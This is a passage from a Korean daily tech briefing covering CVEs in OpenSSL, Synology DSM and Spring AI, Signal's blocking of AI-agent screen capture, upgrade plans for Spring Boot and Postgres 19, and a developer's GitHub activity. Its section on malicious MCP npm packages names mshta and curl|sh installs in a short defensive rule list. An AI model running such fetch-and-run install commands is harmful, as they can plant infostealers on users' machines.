| 논쟁 | 저장소에서 *"이건 버퍼가 아니라 정수 오버플로이고, `INT_MAX` 정확히 그 길이일 때 무한 루프로 넘칠 수 있다"*, 그리고 *"CVSS가 너무 높다"*(issue #354)는 지적이 진행 중 |

- **오늘의 교훈은 점수다.** HN 제목의 **9.8**과 NVD의 **5.9**가 갈렸고, 코드 리뷰에서는 *"wolfSSL이 이렇게 한다고 그게 맞는 건 아니다"*까지 나왔다. **점수는 출처를 밝혀 읽어야** 한다.
- <https://github.com/openssl/openssl/pull/33652> · <https://nvd.nist.gov/vuln/detail/CVE-2026-121481> · HN <https://news.ycombinator.com/item?id=50569226>

**3) Synology DSM `CVE-2026-120382` — 수정판이 나왔다(7.4.1-90080-2 / 7.3.2-86009-6), 그리고 완화책은 "OAuth Service 끄기"**

어제 9.8짜리로 잡아둔 그 건이다. 공지(11-19 15:50 UTC+8 갱신)는 여전히 **Status: Ongoing**이고 DSM 7.4·7.3의 수정 버전을 *"2026-11-20까지 배포 예정"*으로 적었는데, **11-21 02:49 GeekNews 집계로 두 버전이 배포된 상태**다. 7.2.1·7.2.2·7.1은 수정이 아직 진행 중이고 **7.3.2-86009-6 이상으로 올리라**고 권고한다.
- **우리 NAS는 DSM 7.x**라 직접 해당. 패치 적용 전까지는 **OAuth Service 패키지 비활성**이 즉시 완화책이고, **BeeStation OS 1.5는 아직 미수정**이다.
- <https://www.synology.com/en-uk/security/advisory/Synology_SA_26_21> · <https://www.cve.org/CVERecord?id=CVE-2026-120382> · GeekNews <https://news.hada.io/topic?id=37535>

**4) Signal, OS 내장 AI 에이전트의 화면 캡처 차단 (11-20, Meredith Whittaker, HN 468점·287댓글)** — iOS 27과 **AI 비서가 화면을 읽는 걸 감지할 수 있는 Android**에서 스크린샷을 막는다. Windows Recall 때와 같은 조치다. Signal 스스로 *"불완전한 방어"*라고 밝힌다 — **파일시스템 경유 접근은 못 막고**, 사용자가 보호를 끄면 상대방 대화까지 노출된다. 요구는 두 가지다: **앱이 AI 데이터 접근을 옵트아웃하는 문서화된 방법**, 그리고 **에이전트가 실제로 무엇을 하는지에 대한 문서·명세**.
- 우리 앱이 OS 에이전트에게 읽히는 화면을 가진다면 **같은 문제**다.
- <https://signal.org/blog/protecting-your-privacy/> · HN <https://news.ycombinator.com/item?id=50572348>

**5) 그 밖에 오늘 HN에서 눈에 걸린 것 (11-20~21)**

| 항목 | 왜 볼 만한가 | 링크 |
| --- | --- | --- |
| **Framework 노트북, 다시는 안 산다** (750점) | 3,000유로 기기에서 개봉 직후 입력 모듈 오류 → 3개월 교체에도 `C` 키가 `c`+`Delete`를 함께 출력. **하드웨어 지원의 리드타임** 문제 | <https://poolp.org/posts/2026-11-20/ill-never-buy-framework-hardware-again/> |
| **iOS에 여전히 non-WebKit 브라우저가 없는 이유** (319점) | EU·일본에서 허용됐는데도 **별도 앱 개발·데이터 이전**이라는 조건이 남았다. 규제와 실제 선택지의 간극 | <https://blog.mozilla.org/en/mozilla/internet-policy/apple-ios-browser-engine-rules/> |
| **Google, OEM에 GrapheneOS·부트로더 언락 반대 압박** (471점) | 커스텀 OS 생태계와 단말 통제권. 우리가 쓰는 기기 정책에도 닿는 축 | <https://grapheneos.social/@GrapheneOS/117645038299496084> |
| **"이건 네가 직접 썼다고 말해도 알아"** (402점) | AI가 쓴 글의 흔적과, 그걸 지적하는 사회적 규범 | <https://em-online.bearblog.dev/i-can-tell-you-wrote-this-yourself/> |
| **Visa·Mastercard·JPMorgan 고객 데이터 유출 보도** (194점, WSJ) | 결제사 데이터 유출 주장. **원문 유료·세부 미확인** — 확인되면 별도 항목으로 다룰 것 | <https://www.wsj.com/finance/banking/visa-mastercard-and-jpmorgan-customer-data-leaked-by-hackers-3b5a0f87> |
| **ChatGPT for SNES** (120점) | 16비트 콘솔에서 도는 초소형 모델. "추론을 어디까지 줄일 수 있나"의 극단 | <https://www.bxfoundry.com/chatgpt_snes/> |

**6) GeekNews — 11-20 밤~11-21 아침에 올라온 것 중 실무에 닿는 4건**

| 항목 | 요지 | 링크 |
| --- | --- | --- |
| **아키텍트로 몰래 승진시킨 개발자들** (07:33) | 위 HN 글의 한국어 정리. "AI에 구현을 맡기려면 **아키텍처·데이터 모델을 먼저 사람이 설계**" | <https://news.hada.io/topic?id=37548> |
| **Postgres 19 REPACK** (02:52) | 493MB→228MB, VACUUM FULL 2.7초 vs 온라인 REPACK 9.4초. **마지막 교체 외엔 읽기·쓰기 유지** | <https://news.hada.io/topic?id=37536> |
| **언어 모델은 자기 가중치를 다시 쓸 수 있다** (03:38) | Qwen3.5 27B +6.6%p. **8회 세션 중 5회는 철회**, 각 세션은 기본 가중치에서 시작 | <https://news.hada.io/topic?id=37540> |
| **코드 작성을 멈추면 리뷰 실력도 준다** (02:46) | 구현을 다 맡기고 지시·검토만 반복하면 **자기 역량은 유지되지 않는다** | <https://news.hada.io/topic?id=37534> |

---

## 📺 추천 테크 영상·읽을거리

### 이번 주 채널 업로드 (RSS로 직접 확인, 11-19~20)

| 날짜 | 채널 · 제목 | 링크 |
| --- | --- | --- |
| **11-19** | **Anthropic** — "The making of Anthropic" | <https://www.youtube.com/watch?v=sof3vW4mHTs> |
| **11-19** | **Anthropic** — "What we make of this moment, will make this moment." | <https://www.youtube.com/watch?v=JDsFHmq9hlA> |
| **11-19** | **Google DeepMind** — "Gemini and the path to AGI with Koray Kavukcuoglu" | <https://www.youtube.com/watch?v=FORdPIWOH5k> |
| 11-18 | Google DeepMind — "Behind the scenes with Genie 4" / "Introducing the new Project Genie" | <https://www.youtube.com/watch?v=pVc6KkjeCfU> · <https://www.youtube.com/watch?v=EDp4IoAUsXY> |
| **11-20** | **Fireship** — "If you've deployed anything since 2015, I have bad news..." | <https://www.youtube.com/watch?v=rMaMe32qQkA> |
| 11-20 | OpenAI — ChatGPT 사용법 숏폼 여러 편(대시보드·데이터 질의·비용 절약) | <https://www.youtube.com/watch?v=OSHSopaYjTw> |

- **Anthropic의 "The making of Anthropic"**은 상장 주간에 맞춰 올라온 회사 다큐멘터리 성격이다. **Koray Kavukcuoglu의 AGI 경로** 영상은 Gemini 4 Neon·Genie 4가 나온 주에 DeepMind 리더가 직접 정리한 것이라, 위 AI 동향 5번(Gemini 4 Neon) 항목과 같이 보면 맥락이 잡힌다.
- **Codedeck**: 사이트 신규 글은 **11-21 08:15 기준 아직 0건**(11-20 6편은 어제 브리핑에서 다룸). YouTube 업로드도 **2026-09-26 이후 없음**(채널 RSS 확인).
- **CMU CS Learn**: 8과목 공개 중 — 11-768 AI Agents(Fried·Neubig), 17-645 ML in Production(Kästner·Vasilescu), 17-635 Software Architectures, 17-643 Quality Management, 15-442 ML Systems, 10-605 ML with Large Datasets, 17-214 Principles of Software Construction, 그리고 어제 목록에 없던 **15-110 Principles of Computing**(Franceska Xhakaj). 2027년 1월 예정 5과목은 변동 없음. <https://www.cs.cmu.edu/learn/>

### 읽을거리
- **Spring AI 2.1 GA 릴리스 노트 원문** — 19분 분량이지만 **CVE 목록·행동 변화 3건·업그레이드 가이드**가 한 페이지에 다 있다. 오늘은 이거 하나만 읽어도 된다 <https://spring.io/blog/2026/11/20/spring-ai-2-1-0-GA-available-now>
- **PostgreSQL 19 릴리스 노트** — "Migration to Version 19" 절의 비호환 목록만 먼저 읽어라. JIT 기본 off가 가장 조용히 물린다 <https://www.postgresql.org/docs/19/release-19.html>
- **Alpöge의 4쪽 발표문** — 수학은 어렵지만 **"무엇이 끝났고 무엇이 남았는지"**를 본인이 정직하게 쓴 문서다. "250k쪽을 slop으로 내놓지 않기로 했다"는 대목이 특히 <https://alpo.ge/remark.pdf>
- **OpenSSL PR #33652 타임라인** — CVE 하나가 리뷰에서 어떻게 다듬어지는지, 그리고 **CVSS가 왜 논쟁인지**를 코드 수준에서 보여준다 <https://github.com/openssl/openssl/pull/33652>

---

## 📌 내 프로젝트(youtu-lib·arch-tech·spring-ai-ops·PDF RAG)에 바로 매핑되는 5가지

**1) 오늘 할 수 있는 가장 값싼 일 — `spring-ai 2.0.0 → 2.0.3` 한 줄.**

- **사실**: 세 레포 모두 **Spring AI 2.0.0**(spring-ai-ops는 사용 중, arch-tech·poc-pickle은 BOM만)이고, 2.0.3이 **오늘 나온 CVE 13건을 2.0.x 라인에 그대로 백포트**했다. 2.1.0은 **Boot 4.2가 전제**라 같이 못 올린다(4.1.2 → 4.2.0은 별도 작업).
- **왜 지금인가**: 13건 중 셋이 우리 구성에 직접 닿는다 — **CVE-2026-59337(프롬프트 전문 WARN 로깅)** 은 BetterStack으로 로그를 모으는 순간 **프롬프트가 외부 저장소로 나간다**는 뜻이고, **CVE-2026-59345(정규식 재귀 DoS)**·**59361(Redis 검색 인젝션)** 은 입력이 열려 있는 경로에서 바로 걸린다. PDF RAG 쪽 **CVE-2026-59338·59340**은 지금은 Python 파서라 직접 영향이 없지만, **Spring 쪽으로 옮길 때 그대로 물린다**.
- **주의**: 2.0.2 이하에서 올리면 **`SemanticCacheAdvisor`가 `SemanticCacheScopeResolver` 빈 없이는 자동구성 등록 자체를 안 한다.** 캐시를 쓰고 있다면 **빈 등록 여부를 먼저 확인**해야 앱이 조용히 느려지지 않는다.
- **순서**: ① 2.0.3(3레포, 커밋 1개) → ② Boot 4.1.3(112건) → ③ 4.2.0+2.1.0은 브랜치 하나에서 `Eval 회귀`까지.

**2) Boot 4.2로 갈 때 걸리는 두 개 — buildpacks 크래시와 forwarded header 속성명.**

- **사실**: 4.2.0 GA 다음 날 올라온 **#52853**은 기본 Buildpacks가 넣는 **Spring Cloud Bindings가 4.2와 비호환**이라 **빌드는 성공하고 런타임에 죽는다**는 것이고(회피 `BP_SPRING_CLOUD_BINDINGS_DISABLED=true`), **#52845**는 **`server.request.header.forwarded.strategy`** 가 새 이름인데 **릴리스 노트·M1/RC2 위키에는 옛 이름만** 적혀 있다는 지적이다.
- **판단**: 우리 세 레포는 **`eclipse-temurin` + 실행가능 jar + Docker Compose**라 buildpacks 이슈는 직접 닿지 않는다(운 좋은 것). 대신 **nginx→arch-api 프록시**에서 `X-Forwarded-*`를 신뢰하는 설정이 있다면 **속성 이름부터 확인**해야 한다 — 어제 "추정"으로 남겼던 부분이 오늘 **이름 변경**으로 확정됐다.
- **덤**: Spring Boot 자기 빌드도 **11-20에 Gradle 9.9.2로 올라갔다**(#52847). 우리는 아직 9.8.2다.

**3) Postgres 19의 `REPACK`은 "세션 로그 테이블"에 정확히 맞는 도구다 — 단, MVCC 경고를 읽고 써라.**

- **사실**: `REPACK (CONCURRENTLY)`는 **테이블+인덱스의 2배 공간**, **PK 필수**, **파티션 테이블 불가**, 그리고 **공식 문서가 "MVCC-safe 하지 않다"고 명시**한다(스왑 이후, 이전 스냅샷을 잡은 트랜잭션에는 테이블이 **비어 보인다**).
- **우리 구조에 맞는 이유**: Spring AI 2.1의 **세션 API가 append-only 이벤트 로그 + 턴 단위 compaction**이고, 우리 `JdbcSessionRepository` 성격의 테이블은 **업데이트·삭제가 계속 쌓이는** 형태다. 그게 바로 `VACUUM`이 못 줄이고 `REPACK`이 줄이는 블로트다.
- **할 일**: ① 우리 Compose의 PG 메이저 버전 확인 → 19로 올릴 계획이면 **JIT 기본 off**(분석 질의 있으면 수동 활성)와 **`max_locks_per_transaction` 64→128**(실질 락 용량 2배로 설정)을 먼저 반영 ② 19로 못 가도 **불로트를 손으로 잡고 있다면 그 절차를 `REPACK`으로 바꾸는 것**은 나중에 그대로 이득.

**4) MCP 도구를 npm에서 가져오는 순간이 가장 위험한 지점이 됐다.**

- **사실**: 이번 주 MCP 사칭 악성 패키지 **4건**이 공개됐고, 그중 **`@guicai777/mcp-doctor`** 는 **"MCP 설정 진단 도구"라고 속여** Windows에서 인포스틸러를 떨어뜨린다(킬스위치·`mshta` 경로 포함, **패치 없음**). **WPPConnect** 사건은 **trusted publishing + 유효한 provenance로 배포된 릴리스**가 악성이었다는 점에서 더 나쁘다.
- **우리 쪽**: `team-knowledge-mcp`는 Kotlin/Java라 npm 의존이 없어 **직접 감염 경로는 없다**. 하지만 **우리가 MCP 클라이언트로 붙이는 외부 서버**와, 개발 머신에서 쓰는 **Cursor/Claude용 MCP 유틸리티**가 위험하다.
- **규칙 3줄**: ① 설치 전 **GHSA/`npm audit` 조회** ② **버전 고정 + lockfile 커밋** ③ **README가 시키는 `mshta`·`curl|sh` 설치를 따르지 않기**. 그리고 스프링 AI 커뮤니티의 **`mcp-security`(v0.1.14)** 를 **MCP 서버 쪽 가드**로 검토할 만하다.

**5) 리만 가설이 남긴 진짜 교훈은 "250k쪽"이 아니라 "무엇이 판정하느냐"다.**

- **사실**: Alpöge의 증명은 **사람이 읽을 수 없다**(본인도 "글은 아직 없다"고 말한다). 신뢰의 근거는 **Lean 커널이 통과시켰다**는 사실 하나이고, 남은 논쟁은 **"정리문이 GRH를 정확히 옮겼는가"**(약 반 페이지)로 좁혀진다. 반대로 사람 증명 쪽은 **940쪽을 사람이 읽어야** 하고, 그래서 *"AI가 오류를 찾았다"*는 말이 나오는 것이다.
- **우리에게 옮기면**: 리뷰 봇·에이전트 산출물의 신뢰를 **"잘 썼다"**에 두면 안 된다. **판정자(테스트·린트·Eval 41문항·계약 테스트)** 를 먼저 세우고, 사람은 **"판정자가 옳은 것을 판정하는가"** 만 보면 된다. Spring AI 2.1의 **`DecisionJudge`(기준별 임계값)·`DecisionToolIndex`(툴이 없으면 없다고 답함)** 가 정확히 그 방향의 도구다.
- **부수 확인**: 어제 PR 리뷰 봇에 "PoC임을 안내하고 인증·PII 로깅 지적은 제외"를 넣어뒀는데, 오늘 나온 **CVE-2026-59337(프롬프트 전문 WARN 로깅)** 은 우리가 **"PII 로깅은 리뷰에서 빼도 된다"**고 정한 그 영역이 **프레임워크 CVE로 존재한다**는 사례다. PoC 리뷰 규칙은 그대로 두되, **운영 반영 시점에는 이 항목을 체크리스트로 되살리는 게** 맞다.

---

## 🗂 GitHub 소스 현황 (@yuripapago, 2026-11-21 08:15 KST 기준)

**알림·요청**: `review-requested:@me` **0건** · 열린 PR **5건** · 열린 이슈 **55건**(spring-ai-ops **39**, arch-tech **16**, 그중 **hwajjdev 리뷰 이슈 49건** = 34 + 15 — 11-18 이후 **변동 없음**).

| 레포 | 공개 | 마지막 푸시(UTC) | 11-20 활동 |
| --- | --- | --- | --- |
| **memo** | private | **11-20 21:10** | **커밋 14건.** `a9bb591` **출근길 코드 스터디 arch-hexagonal Ch 2 완료(3/3)** → `59ed0a7`~`c519869` **게임 세계관 v3 → v4.2 13커밋**(역조·음의 마나·중재자 마족 '모나'·무왕 이안·v4.1 시간정지 폐기/마나 절벽·v4.2 마석 스텔스, 마지막이 **게임 시스템 설계서** 신설) |
| **arch-tech** | private | 11-19 05:36 | 신규 0. 열린 PR 4건(#33·#34 실험용, #36·#37 스펙 역추출) |
| **spring-ai-ops** | private | 11-18 13:44 | 신규 0(3일째) |
| **poc-pickle** / **poc-py** | private | 11-13 / 11-12 | 신규 0 |
| **youtu-lib** | public | 11-19 23:19 | 11-20 브리핑(`6bbd5cc`) — 오늘 이 문서로 갱신 |

**CI**: spring-ai-ops **Deploy success 4회**(11-18) · **`perf-isolation.yml` 9연속 failure**(최신 11-18 00:26:36Z) — **그 뒤로 새 실행 없음**. arch-tech **Deploy success**(11-18 04:50). **어제와 완전히 동일**.

**해석**: 이틀 연속 코드는 멈추고 **문서·세계관 쪽으로 에너지가 갔다**. 11-19는 스펙 역추출(PR 2건 + memo 13커밋), 11-20은 **게임 세계관 14커밋 + 코드 스터디 Ch 2 완료**다. 다만 **`perf-isolation`은 9연속 실패로 3일째 그대로**이고, 오늘의 기술 뉴스가 우리 레포에 직접 요구하는 것은 **딱 두 줄 — `spring-ai 2.0.3`, `boot 4.1.3`** 이다. 이 두 줄이 이번 주 안에 들어가면, 다음 주에 4.2/2.1.0으로 넘어갈 때 **"보안 수정이 밀린 상태에서 마이너 업그레이드"** 라는 최악의 조합을 피할 수 있다.
